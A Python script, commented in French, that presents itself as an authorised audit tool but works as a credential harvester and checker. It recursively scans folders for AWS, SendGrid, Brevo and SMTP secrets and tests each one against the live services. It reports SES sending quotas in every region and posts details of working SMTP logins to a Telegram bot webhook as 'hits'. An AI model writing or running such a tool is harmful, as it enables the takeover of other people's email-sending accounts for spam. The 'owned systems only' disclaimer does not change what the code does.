#!/usr/bin/env python3
"""
Audit de dossiers : détecte des motifs ressemblant à des identifiants dans des fichiers texte
et vérifie leur validité (usage autorisé uniquement — systèmes dont vous êtes propriétaire).

Dépendances : pip install boto3 requests
Variables d'environnement optionnelles :
  TELEGRAM_HIT_WEBHOOK — URL complète (ex. https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>)
                         pour notifier les hits SMTP fonctionnels.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import smtplib
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable, Iterator
from uuid import uuid4

try:
    import tkinter as tk
    from tkinter import filedialog
except ImportError:
    tk = None  # type: ignore
    filedialog = None  # type: ignore

try:
    import boto3
    from botocore.exceptions import BotoCoreError, ClientError
except ImportError:
    boto3 = None  # type: ignore
    BotoCoreError = ClientError = Exception  # type: ignore

try:
    import requests
except ImportError:
    requests = None  # type: ignore

# ---------------------------------------------------------------------------
# Regex / constantes
# ---------------------------------------------------------------------------

AWS_ACCESS_KEY_RE = re.compile(r"\b((?:AKIA|ASIA)[0-9A-Z]{16})\b")
# Clé secrète AWS : 40 caractères base64-like (ligne seule ou après =)
AWS_SECRET_RE = re.compile(
    r"(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY|secret_access_key|SecretAccessKey)"
    r'[\s:=]+["\']?([A-Za-z0-9/+=]{40})["\']?',
    re.I,
)
AWS_SECRET_STANDALONE_RE = re.compile(r"(?<![A-Za-z0-9/+=])([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])")

SENDGRID_KEY_RE = re.compile(r"\b(SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b")

BREVO_KEY_RE = re.compile(r"\b(xkeysib-[a-f0-9\-]+)\b", re.I)

TEXT_EXTENSIONS = {
    ".txt",
    ".env",
    ".ini",
    ".cfg",
    ".conf",
    ".config",
    ".json",
    ".yaml",
    ".yml",
    ".xml",
    ".csv",
    ".log",
    ".md",
    ".properties",
    ".sh",
    ".py",
    ".js",
    ".ts",
    ".php",
    "",
}

SMTP_HOST_KEYS = (
    "SMTP_HOST",
    "MAIL_HOST",
    "EMAIL_HOST",
    "smtp_host",
    "mail_host",
)
SMTP_PORT_KEYS = ("SMTP_PORT", "MAIL_PORT", "EMAIL_PORT", "smtp_port")
SMTP_USER_KEYS = ("SMTP_USER", "SMTP_USERNAME", "MAIL_USERNAME", "EMAIL_HOST_USER", "smtp_user")
SMTP_PASS_KEYS = (
    "SMTP_PASS",
    "SMTP_PASSWORD",
    "MAIL_PASSWORD",
    "EMAIL_HOST_PASSWORD",
    "smtp_password",
)

# Régions AWS courantes (STS + SES ; complété par API si boto3 le permet)
def _all_ses_regions() -> list[str]:
    if boto3:
        try:
            return sorted(boto3.session.Session().get_available_regions("ses"))
        except Exception:
            pass
    return [
        "us-east-1",
        "us-east-2",
        "us-west-1",
        "us-west-2",
        "af-south-1",
        "ap-east-1",
        "ap-south-1",
        "ap-northeast-1",
        "ap-northeast-2",
        "ap-northeast-3",
        "ap-southeast-1",
        "ap-southeast-2",
        "ap-southeast-3",
        "ca-central-1",
        "eu-central-1",
        "eu-central-2",
        "eu-west-1",
        "eu-west-2",
        "eu-west-3",
        "eu-north-1",
        "eu-south-1",
        "eu-south-2",
        "me-south-1",
        "me-central-1",
        "sa-east-1",
    ]


def hit_banner(service: str, status: str, detail: str, extra: str = "") -> str:
    line = "═" * 52
    body = f"{detail}"
    if extra:
        body = f"{body}\n{extra}"
    return (
        f"\n{line}\n"
        f"  █ HIT — {service.upper()} — {status}\n"
        f"{line}\n"
        f"{body}\n"
        f"{line}\n"
    )


def post_telegram_webhook(webhook_url: str, text: str, timeout: float = 15.0) -> bool:
    if not webhook_url:
        return False
    # Si l'URL est déjà sendMessage avec query params, on peut POST form ou JSON selon Telegram
    payload = json.dumps({"text": text[:4000]}).encode("utf-8")
    req = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return 200 <= resp.status < 300
    except urllib.error.HTTPError as e:
        # Telegram attend souvent POST application/x-www-form-urlencoded
        if e.code == 400:
            form = urllib.parse.urlencode({"text": text[:4000]}).encode("utf-8")
            req2 = urllib.request.Request(
                webhook_url,
                data=form,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            try:
                with urllib.request.urlopen(req2, timeout=timeout) as resp2:
                    return 200 <= resp2.status < 300
            except Exception:
                return False
        return False
    except Exception:
        return False


def iter_text_files(root: Path, max_size_mb: float) -> Iterator[Path]:
    max_bytes = int(max_size_mb * 1024 * 1024)
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        try:
            if p.stat().st_size > max_bytes:
                continue
        except OSError:
            continue
        suf = p.suffix.lower()
        if suf not in TEXT_EXTENSIONS and suf not in {".htm", ".html"}:
            continue
        yield p


def read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return ""


def parse_env_lines(content: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            k, _, v = line.partition("=")
            k = k.strip()
            v = v.strip().strip('"').strip("'")
            if k:
                out[k] = v
    return out


@dataclass
class AwsPair:
    access_key: str
    secret_key: str
    source_file: str

    def fingerprint(self) -> str:
        return f"aws:{self.access_key}:{self.secret_key[:8]}..."


@dataclass
class SmtpConfig:
    host: str
    port: int
    user: str
    password: str
    source_file: str

    def fingerprint(self) -> str:
        return f"smtp:{self.host}:{self.port}:{self.user}"


def extract_aws_pairs(content: str, source: str) -> list[AwsPair]:
    pairs: list[AwsPair] = []
    env = parse_env_lines(content)
    ak = (
        env.get("AWS_ACCESS_KEY_ID")
        or env.get("aws_access_key_id")
        or env.get("AWS_ACCESS_KEY")
    )
    sk = env.get("AWS_SECRET_ACCESS_KEY") or env.get("aws_secret_access_key")
    if ak and sk and AWS_ACCESS_KEY_RE.search(ak) and len(sk) >= 40:
        pairs.append(AwsPair(ak.strip(), sk[:40] if len(sk) >= 40 else sk, source))

    lines = content.splitlines()
    for i, line in enumerate(lines):
        for m in AWS_ACCESS_KEY_RE.finditer(line):
            access = m.group(1)
            window = "\n".join(lines[i : min(i + 25, len(lines))])
            sm = AWS_SECRET_RE.search(window)
            secret = sm.group(1) if sm else None
            if not secret:
                for j in range(i, min(i + 15, len(lines))):
                    for cand in AWS_SECRET_STANDALONE_RE.findall(lines[j]):
                        if 40 <= len(cand) <= 45 and cand != access:
                            secret = cand[:40]
                            break
                    if secret:
                        break
            if secret and len(secret) >= 40:
                pairs.append(AwsPair(access, secret[:40], source))

    # Déduplication
    seen: set[tuple[str, str]] = set()
    uniq: list[AwsPair] = []
    for p in pairs:
        key = (p.access_key, p.secret_key)
        if key not in seen:
            seen.add(key)
            uniq.append(p)
    return uniq


def extract_sendgrid(content: str, source: str) -> list[tuple[str, str]]:
    found = list({m.group(1) for m in SENDGRID_KEY_RE.finditer(content)})
    return [(k, source) for k in found]


def extract_brevo(content: str, source: str) -> list[tuple[str, str]]:
    found = list({m.group(1) for m in BREVO_KEY_RE.finditer(content)})
    return [(k, source) for k in found]


def extract_smtp(content: str, source: str) -> list[SmtpConfig]:
    env = parse_env_lines(content)
    host = next((env[k] for k in SMTP_HOST_KEYS if k in env and env[k]), None)
    if not host:
        return []
    port_s = next((env[k] for k in SMTP_PORT_KEYS if k in env), "587")
    try:
        port = int(port_s)
    except ValueError:
        port = 587
    user = next((env[k] for k in SMTP_USER_KEYS if k in env), "")
    password = next((env[k] for k in SMTP_PASS_KEYS if k in env), "")
    if not password:
        return []
    return [SmtpConfig(host.strip(), port, user.strip(), password, source)]


def verify_aws(pair: AwsPair) -> tuple[bool, str]:
    if not boto3:
        return False, "boto3 non installé"
    try:
        client = boto3.client(
            "sts",
            aws_access_key_id=pair.access_key,
            aws_secret_access_key=pair.secret_key,
            region_name="us-east-1",
        )
        ident = client.get_caller_identity()
        arn = ident.get("Arn", "?")
        aid = ident.get("Account", "?")
        return True, f"Compte {aid} | {arn}"
    except (ClientError, BotoCoreError) as e:
        return False, str(e)


def aws_ses_quota_all_regions(access: str, secret: str) -> list[tuple[str, str]]:
    if not boto3:
        return []
    results: list[tuple[str, str]] = []
    for region in _all_ses_regions():
        try:
            ses = boto3.client(
                "ses",
                aws_access_key_id=access,
                aws_secret_access_key=secret,
                region_name=region,
            )
            q = ses.get_send_quota()
            max_24 = q.get("Max24HourSend")
            sent = q.get("SentLast24Hours")
            results.append((region, f"Max24h={max_24} | Envoyé24h={sent}"))
        except ClientError as e:
            code = e.response.get("Error", {}).get("Code", "")
            if code in ("AccessDenied", "UnauthorizedOperation"):
                results.append((region, f"Refus: {code}"))
            elif code in ("InvalidClientTokenId", "SignatureDoesNotMatch"):
                break
            else:
                # SES indisponible dans la région ou compte non SES
                msg = e.response.get("Error", {}).get("Message", str(e))[:80]
                results.append((region, f"— {msg}"))
        except BotoCoreError as e:
            results.append((region, f"Erreur: {e}"[:80]))
    return results


def verify_sendgrid(api_key: str) -> tuple[bool, str]:
    if not requests:
        return False, "requests non installé"
    try:
        r = requests.get(
            "https://api.sendgrid.com/v3/user/credits",
            headers={"Authorization": f"Bearer {api_key}"},
            timeout=20,
        )
        if r.status_code == 200:
            data = r.json() if r.content else {}
            return True, json.dumps(data, ensure_ascii=False)[:500]
        return False, f"HTTP {r.status_code}: {r.text[:200]}"
    except requests.RequestException as e:
        return False, str(e)


def verify_brevo(api_key: str) -> tuple[bool, str]:
    if not requests:
        return False, "requests non installé"
    try:
        r = requests.get(
            "https://api.brevo.com/v3/account",
            headers={"api-key": api_key},
            timeout=20,
        )
        if r.status_code == 200:
            data = r.json()
            email = data.get("email", "")
            plan = data.get("plan")
            credits = data.get("credits")
            summary = f"email={email} | credits={credits} | plan={str(plan)[:180]}"
            return True, summary
        return False, f"HTTP {r.status_code}: {r.text[:200]}"
    except requests.RequestException as e:
        return False, str(e)


def verify_smtp(cfg: SmtpConfig) -> tuple[bool, str]:
    ctx = ssl.create_default_context()
    try:
        if cfg.port == 465:
            server = smtplib.SMTP_SSL(cfg.host, cfg.port, timeout=25, context=ctx)
        else:
            server = smtplib.SMTP(cfg.host, cfg.port, timeout=25)
            try:
                server.starttls(context=ctx)
            except smtplib.SMTPException:
                pass
        server.login(cfg.user, cfg.password)
        server.quit()
        return True, "Authentification SMTP réussie"
    except Exception as e:
        return False, str(e)


def pick_folder_gui() -> Path | None:
    if not tk or not filedialog:
        return None
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askdirectory(title="Choisir le dossier à analyser")
    root.destroy()
    return Path(path) if path else None


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Audit de fichiers texte : motifs AWS / SendGrid / Brevo / SMTP et vérifications."
    )
    parser.add_argument(
        "--folder",
        type=Path,
        help="Dossier à analyser (sinon dialogue graphique si tkinter disponible)",
    )
    parser.add_argument(
        "--max-file-mb",
        type=float,
        default=4.0,
        help="Ignorer les fichiers plus gros que ce seuil (Mo)",
    )
    parser.add_argument(
        "--telegram-webhook",
        default=os.environ.get("TELEGRAM_HIT_WEBHOOK", ""),
        help="URL webhook pour notifier les SMTP OK (ou variable TELEGRAM_HIT_WEBHOOK)",
    )
    args = parser.parse_args()

    folder = args.folder
    if not folder:
        picked = pick_folder_gui()
        if not picked:
            print("Aucun dossier sélectionné. Utilisez --folder /chemin", file=sys.stderr)
            return 2
        folder = picked
    folder = folder.resolve()
    if not folder.is_dir():
        print(f"Dossier invalide: {folder}", file=sys.stderr)
        return 2

    print(hit_banner("scan", "START", f"Dossier: {folder}", f"max fichier: {args.max_file_mb} Mo"))

    all_aws: list[AwsPair] = []
    all_sg: list[tuple[str, str]] = []
    all_brevo: list[tuple[str, str]] = []
    all_smtp: list[SmtpConfig] = []

    for fp in iter_text_files(folder, args.max_file_mb):
        text = read_text(fp)
        if not text:
            continue
        rel = str(fp.relative_to(folder))
        all_aws.extend(extract_aws_pairs(text, rel))
        all_sg.extend(extract_sendgrid(text, rel))
        all_brevo.extend(extract_brevo(text, rel))
        all_smtp.extend(extract_smtp(text, rel))

    # Dédupliquer listes
    def dedupe_aws(xs: list[AwsPair]) -> list[AwsPair]:
        s: set[tuple[str, str]] = set()
        o: list[AwsPair] = []
        for x in xs:
            k = (x.access_key, x.secret_key)
            if k not in s:
                s.add(k)
                o.append(x)
        return o

    all_aws = dedupe_aws(all_aws)

    def dedupe_keys(items: list[tuple[str, str]]) -> list[tuple[str, str]]:
        seen: set[str] = set()
        out: list[tuple[str, str]] = []
        for k, s in items:
            if k in seen:
                continue
            seen.add(k)
            out.append((k, s))
        return out

    all_sg = dedupe_keys(all_sg)
    all_brevo = dedupe_keys(all_brevo)

    seen_smtp_fp: set[str] = set()
    smtp_unique: list[SmtpConfig] = []
    for c in all_smtp:
        fp = c.fingerprint()
        if fp in seen_smtp_fp:
            continue
        seen_smtp_fp.add(fp)
        smtp_unique.append(c)
    all_smtp = smtp_unique

    print(f"Motifs trouvés — AWS paires: {len(all_aws)}, SendGrid: {len(all_sg)}, Brevo: {len(all_brevo)}, SMTP: {len(all_smtp)}")

    webhook = (args.telegram_webhook or "").strip()

    for pair in all_aws:
        ok, msg = verify_aws(pair)
        if ok:
            regions_info = aws_ses_quota_all_regions(pair.access_key, pair.secret_key)
            reg_lines = "\n".join(f"    [{r}] {info}" for r, info in regions_info[:60])
            if len(regions_info) > 60:
                reg_lines += f"\n    ... ({len(regions_info)} régions au total)"
            print(
                hit_banner(
                    "aws",
                    "VALID",
                    f"Fichier: {pair.source_file}",
                    f"{msg}\n  Quota SES par région:\n{reg_lines or '  (aucun résultat)'}",
                )
            )
        else:
            print(hit_banner("aws", "INVALID", f"Fichier: {pair.source_file}", msg))

    for key, src in all_sg:
        ok, msg = verify_sendgrid(key)
        status = "VALID" if ok else "INVALID"
        print(hit_banner("sendgrid", status, f"Fichier: {src}", f"Quota / crédits: {msg}"))

    for key, src in all_brevo:
        ok, msg = verify_brevo(key)
        status = "VALID" if ok else "INVALID"
        print(hit_banner("brevo", status, f"Fichier: {src}", f"Compte / quota: {msg}"))

    for cfg in all_smtp:
        ok, msg = verify_smtp(cfg)
        status = "VALID" if ok else "INVALID"
        print(hit_banner("smtp", status, f"Fichier: {cfg.source_file}", f"{cfg.host}:{cfg.port} user={cfg.user!r}\n{msg}"))
        if ok and webhook:
            note = post_telegram_webhook(
                webhook,
                f"HIT SMTP\n{cfg.host}:{cfg.port}\nuser={cfg.user}\nfile={cfg.source_file}\nid={uuid4().hex[:8]}",
            )
            print(hit_banner("telegram", "SENT" if note else "FAIL", "Notification webhook", str(note)))

    print(hit_banner("scan", "DONE", "Analyse terminée", ""))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
